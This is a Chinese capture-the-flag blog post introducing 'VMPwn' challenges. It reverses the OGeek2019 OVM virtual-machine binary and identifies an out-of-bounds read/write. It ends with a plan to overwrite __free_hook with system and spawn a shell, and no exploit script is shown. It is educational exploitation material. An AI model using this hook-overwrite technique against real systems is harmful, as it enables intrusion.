@@ -1,0 +1,862 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-flash.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-48x48-next.ico?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.ico?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Pwn," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="前言好像距离上一次更新博客很久很久了(咕咕咕)，今天是写一篇关于VMPWN的萌新入门学习笔记哈哈哈。 起因是上海大学生原题0解，痛定思痛，以后打过的比赛要及时复现才行233。 室友有陪女朋友的，有打游戏的，只有我孤独学习VMPwn~ VMPwn简介定义VMPwn指在程序中实现运算指令来模拟程序的运行（汇编类），或者在程序中自定义运算指令的程序（编译类）。 简单来说就是用程序、代码来实现模拟PC中某">
+<meta property="og:type" content="article">
+<meta property="og:title" content="VMPwn入门">
+<meta property="og:url" content="https://www.sketchplane.top/2020/12/07/VMPWN%E5%85%A5%E9%97%A8/index.html">
+<meta property="og:site_name" content="sketch_pl4ne">
+<meta property="og:description" content="前言好像距离上一次更新博客很久很久了(咕咕咕)，今天是写一篇关于VMPWN的萌新入门学习笔记哈哈哈。 起因是上海大学生原题0解，痛定思痛，以后打过的比赛要及时复现才行233。 室友有陪女朋友的，有打游戏的，只有我孤独学习VMPwn~ VMPwn简介定义VMPwn指在程序中实现运算指令来模拟程序的运行（汇编类），或者在程序中自定义运算指令的程序（编译类）。 简单来说就是用程序、代码来实现模拟PC中某">
+<meta property="og:image" content="https://t1.picb.cc/uploads/2020/12/07/ZkMJ01.png">
+<meta property="article:published_time" content="2020-12-07T12:35:55.000Z">
+<meta property="article:modified_time" content="2020-12-07T14:58:46.743Z">
+<meta property="article:author" content="sketch_pl4ne">
+<meta property="article:tag" content="Pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://t1.picb.cc/uploads/2020/12/07/ZkMJ01.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://www.sketchplane.top/2020/12/07/VMPWN入门/"/>
+
+
+
+
+
+  <title>VMPwn入门 | sketch_pl4ne</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="sketch_pl4ne" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+    <link rel="stylesheet" href="/dist/APlayer.min.css">
+    <div id="aplayer"></div>
+    <script type="text/javascript" src="/dist/APlayer.min.js"></script>
+    <script type="text/javascript" src="/dist/music.js"></script>
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">sketch_pl4ne</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://www.sketchplane.top/2020/12/07/VMPWN%E5%85%A5%E9%97%A8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="sketch_pl4ne">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="sketch_pl4ne">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">VMPwn入门</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-12-07T20:35:55+08:00">
+                2020-12-07
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i> 阅读数
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>次
+            </span>
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  2k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  10
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>好像距离上一次更新博客很久很久了(咕咕咕)，今天是写一篇关于VMPWN的萌新入门学习笔记哈哈哈。</p>
+<p>起因是上海大学生原题0解，痛定思痛，以后打过的比赛要及时复现才行233。</p>
+<p>室友有陪女朋友的，有打游戏的，只有我孤独学习VMPwn~</p>
+<h2 id="VMPwn简介"><a href="#VMPwn简介" class="headerlink" title="VMPwn简介"></a>VMPwn简介</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>VMPwn指在程序中实现运算指令来模拟程序的运行（汇编类），或者在程序中自定义运算指令的程序（编译类）。</p>
+<p>简单来说就是用程序、代码来实现模拟PC中某个部件。</p>
+<h3 id="题目特征"><a href="#题目特征" class="headerlink" title="题目特征"></a>题目特征</h3><ul>
+<li>代码量大，仔细观察可以发现重复度高</li>
+<li>存在模拟的寄存器（bp、sp、pc等等）、opcode存储区域、模拟的堆栈区域、模拟的输出存储区域</li>
+<li>存在一个analyser分析器，用来分析用户输入的opcode</li>
+<li>循环读取opcode并转化为<strong>伪汇编指令</strong></li>
+</ul>
+<h3 id="核心点"><a href="#核心点" class="headerlink" title="核心点"></a>核心点</h3><p>逆向出程序的代码中每一部分对应的<strong>汇编代码</strong>，理清程序逻辑。目前大多数题目都是越界溢出，难点在如何逆向。</p>
+<h3 id="经典例题"><a href="#经典例题" class="headerlink" title="经典例题"></a>经典例题</h3><ul>
+<li>ciscn_2019_qual_virtual</li>
+<li>[OGeek2019 Final] OVM</li>
+<li>RCTF2020 VM</li>
+<li>上海大学生 cpu_emulator</li>
+</ul>
+<p>下面直接看例题。</p>
+<h2 id="OGeek2019-Final-OVM"><a href="#OGeek2019-Final-OVM" class="headerlink" title="[OGeek2019 Final] OVM"></a>[OGeek2019 Final] OVM</h2><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>首先是checksec：64位，除了没canary其他保护全开。</p>
+<img src="https://t1.picb.cc/uploads/2020/12/07/ZkMJ01.png" alt="ovm_checksec" style="zoom:67%;" />
+
+<p>下面直接分析代码，注意这里部分变量为了好理解，笔者有重命名。</p>
+<p>主函数代码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int16 <span class="built_in">size</span>; <span class="comment">// [rsp+2h] [rbp-Eh]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int16 PC; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int16 _SP; <span class="comment">// [rsp+6h] [rbp-Ah]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  comment[<span class="number">0</span>] = <span class="built_in">malloc</span>(<span class="number">0x8C</span>uLL);									<span class="comment">//(注意)comment是指针数组，元素0的位置存了malloc返回的指针</span></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0L</span>L);</span><br><span class="line">  signal(<span class="number">2</span>, signal_handler);</span><br><span class="line">  <span class="built_in">write</span>(<span class="number">1</span>, <span class="string">"WELCOME TO OVM PWN\n"</span>, <span class="number">0x16</span>uLL);</span><br><span class="line">  <span class="built_in">write</span>(<span class="number">1</span>, <span class="string">"PC: "</span>, <span class="number">4u</span>LL);</span><br><span class="line">  _isoc99_scanf(<span class="string">"%hd"</span>, &amp;PC);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="built_in">write</span>(<span class="number">1</span>, <span class="string">"SP: "</span>, <span class="number">4u</span>LL);</span><br><span class="line">  _isoc99_scanf(<span class="string">"%hd"</span>, &amp;_SP);</span><br><span class="line">  getchar();</span><br><span class="line">  reg[<span class="number">13</span>] = _SP;                                <span class="comment">// 模拟的SP寄存器</span></span><br><span class="line">  reg[<span class="number">15</span>] = PC;                                 <span class="comment">// 模拟的PC寄存器</span></span><br><span class="line">  <span class="built_in">write</span>(<span class="number">1</span>, <span class="string">"CODE SIZE: "</span>, <span class="number">0xB</span>uLL);</span><br><span class="line">  _isoc99_scanf(<span class="string">"%hd"</span>, &amp;<span class="built_in">size</span>);                  <span class="comment">// size的单位是4字节</span></span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">if</span> ( _SP + <span class="built_in">size</span> &gt; <span class="number">65536</span> || !<span class="built_in">size</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">write</span>(<span class="number">1</span>, <span class="string">"EXCEPTION\n"</span>, <span class="number">0xA</span>uLL);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">155</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">write</span>(<span class="number">1</span>, <span class="string">"CODE: "</span>, <span class="number">6u</span>LL);</span><br><span class="line">  <span class="built_in">running</span> = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; <span class="built_in">size</span> &gt; i; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    _isoc99_scanf(<span class="string">"%d"</span>, &amp;opcode[PC + i]);</span><br><span class="line">    <span class="keyword">if</span> ( (opcode[i + PC] &amp; <span class="number">0xFF000000</span>) == <span class="number">0xFF000000</span> )<span class="comment">// 这里是对opcode的值进行限定，如果是FF开头就转成E0退出程序，</span></span><br><span class="line">      opcode[i + PC] = <span class="number">0xE0000000</span>;</span><br><span class="line">    getchar();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="built_in">running</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = fetch();                               <span class="comment">// 一次读取opcode数组中的一个元素，四字节大小</span></span><br><span class="line">    execute(v7);																<span class="comment">// 执行读取到用户输入的4字节指令片段</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">write</span>(<span class="number">1</span>, <span class="string">"HOW DO YOU FEEL AT OVM?\n"</span>, <span class="number">0x1B</span>uLL);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, comment[<span class="number">0</span>], <span class="number">0x8C</span>uLL);</span><br><span class="line">  sendcomment(comment[<span class="number">0</span>]);                      <span class="comment">// free掉comment[0]</span></span><br><span class="line">  <span class="built_in">write</span>(<span class="number">1</span>, <span class="string">"Bye\n"</span>, <span class="number">4u</span>LL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里经过不断调试，踩了个坑：直接输入0xFF000000是不会打印reg[0~15]的，注释处也标记了，按理说这里应该是给PC置大于1的值，然后我们opcode第一个元素写入0xFF000000来绕过，但是这里是<strong>给SP置大于1的值</strong>。</p>
+<p>重头戏在execute()，也就是我们重点要逆向的地方，先来看题目代码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> __fastcall <span class="title">execute</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">ssize_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 byte1; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 byte2; <span class="comment">// [rsp+19h] [rbp-7h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 byte3; <span class="comment">// [rsp+1Ah] [rbp-6h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  byte3 = (a1 &amp; <span class="number">0xF0000</span>u) &gt;&gt; <span class="number">16</span>;</span><br><span class="line">  byte2 = (a1 &amp; <span class="number">0xF00</span>) &gt;&gt; <span class="number">8</span>;</span><br><span class="line">  byte1 = a1 &amp; <span class="number">0xF</span>;</span><br><span class="line">  result = HIBYTE(a1);</span><br><span class="line">  <span class="keyword">if</span> ( HIBYTE(a1) == <span class="number">0x70</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = reg;</span><br><span class="line">    reg[byte3] = reg[byte1] + reg[byte2];</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( result &gt; <span class="number">0x70</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( result == <span class="number">0xB0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      result = reg;</span><br><span class="line">      reg[byte3] = reg[byte1] ^ reg[byte2];</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( result &gt; <span class="number">0xB0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( result == <span class="number">0xD0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        result = reg;</span><br><span class="line">        reg[byte3] = reg[byte2] &gt;&gt; reg[byte1];</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( result &gt; <span class="number">0xD0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( result == <span class="number">0xE0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">running</span> = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">if</span> ( !reg[<span class="number">13</span>] )</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">write</span>(<span class="number">1</span>, <span class="string">"EXIT\n"</span>, <span class="number">5u</span>LL);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( result != <span class="number">0xFF</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">return</span> result;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">running</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">"R%d: %X\n"</span>, i, reg[i]);       <span class="comment">// 打印寄存器r[0~15]</span></span><br><span class="line">        result = <span class="built_in">write</span>(<span class="number">1</span>, <span class="string">"HALT\n"</span>, <span class="number">5u</span>LL);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( result == <span class="number">0xC0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        result = reg;</span><br><span class="line">        reg[byte3] = reg[byte2] &lt;&lt; reg[byte1];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">switch</span> ( result )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x90</span>:</span><br><span class="line">          result = reg;</span><br><span class="line">          reg[byte3] = reg[byte1] &amp; reg[byte2];</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xA0</span>:</span><br><span class="line">          result = reg;</span><br><span class="line">          reg[byte3] = reg[byte1] | reg[byte2];</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x80</span>:</span><br><span class="line">          result = reg;</span><br><span class="line">          reg[byte3] = reg[byte2] - reg[byte1];</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( result == <span class="number">0x30</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = reg;</span><br><span class="line">    reg[byte3] = opcode[reg[byte1]];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( result &gt; <span class="number">0x30</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( result )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x50</span>:</span><br><span class="line">        LODWORD(result) = reg[<span class="number">13</span>];</span><br><span class="line">        reg[<span class="number">13</span>] = result + <span class="number">1</span>;</span><br><span class="line">        result = result;</span><br><span class="line">        <span class="built_in">stack</span>[result] = reg[byte3];</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x60</span>:</span><br><span class="line">        --reg[<span class="number">13</span>];</span><br><span class="line">        result = reg;</span><br><span class="line">        reg[byte3] = <span class="built_in">stack</span>[reg[<span class="number">13</span>]];</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x40</span>:</span><br><span class="line">        result = opcode;</span><br><span class="line">        opcode[reg[byte1]] = reg[byte3];</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( result == <span class="number">0x10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = reg;</span><br><span class="line">    reg[byte3] = a1;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( result == <span class="number">0x20</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = reg;</span><br><span class="line">    reg[byte3] = a1 == <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>首先这里又有个坑，<code>byte3 = (a1 &amp; 0xF0000u) &gt;&gt; 16;</code>这段代码拿python一跑就知道少了个F，应该是<code>byte3 = (a1 &amp; 0xFF0000u) &gt;&gt; 16;</code></p>
+<p>这种代码算比较简单的，逐段分析就可以逆向出功能：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">0x10: reg[byte3] &#x3D; a1;</span><br><span class="line">0x20: reg[byte3] &#x3D; a1 &#x3D;&#x3D; 0;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0x30: reg[byte3] &#x3D; opcode[reg[byte1]]; 读</span><br><span class="line">mov reg[byte3], opcode[reg[byte1]]</span><br><span class="line">0x40: opcode[reg[byte1]] &#x3D; reg[byte3]; 写</span><br><span class="line">mov opcode[reg[byte1]], reg[byte3]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0x50: ++reg[13]						# push reg[byte3]</span><br><span class="line">      stack[--reg[13]] &#x3D; reg[byte3];</span><br><span class="line">0x60: --reg[13];      				# pop reg[byte3]</span><br><span class="line">      reg[byte3] &#x3D; stack[reg[13]];</span><br><span class="line">0x70: reg[byte3] &#x3D; reg[byte1] + reg[byte2];</span><br><span class="line">0x80: reg[byte3] &#x3D; reg[byte2] - reg[byte1];</span><br><span class="line">0x90: reg[byte3] &#x3D; reg[byte1] &amp; reg[byte2];</span><br><span class="line">0xA0: reg[byte3] &#x3D; reg[byte1] | reg[byte2];</span><br><span class="line">0xB0: reg[byte3] &#x3D; reg[byte1] ^ reg[byte2];</span><br><span class="line">0xC0: reg[byte3] &#x3D; reg[byte2] &lt;&lt; reg[byte1];</span><br><span class="line">0xD0: reg[byte3] &#x3D; reg[byte2] &gt;&gt; reg[byte1];</span><br><span class="line">0xE0: exit</span><br><span class="line">0xFF: print reg[0~15]</span><br></pre></td></tr></table></figure>
+
+<p>这里显然是当opcode[i]的高字节等于0x30或者0x40时由于数组下标没有判断，造成数组越界读写漏洞。</p>
+<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>首先看回main函数，最下面允许用户输入数据到comment[0]，然后free(comment[0])：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">comment[<span class="number">0</span>] = <span class="built_in">malloc</span>(<span class="number">0x8C</span>uLL);									<span class="comment">//(注意)comment是指针数组，元素0的位置存了malloc返回的指针</span></span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"><span class="built_in">read</span>(<span class="number">0</span>, comment[<span class="number">0</span>], <span class="number">0x8C</span>uLL);</span><br><span class="line">sendcomment(comment[<span class="number">0</span>]);                      <span class="comment">// free掉comment[0]</span></span><br></pre></td></tr></table></figure>
+
+<p>由于数组越界读写我们可以读写内存，如果我们能覆盖__free_hook的地址为system，然后再在comment[0]指向的内存区域写入<code>/bin/sh\00</code>，即可getshell。</p>
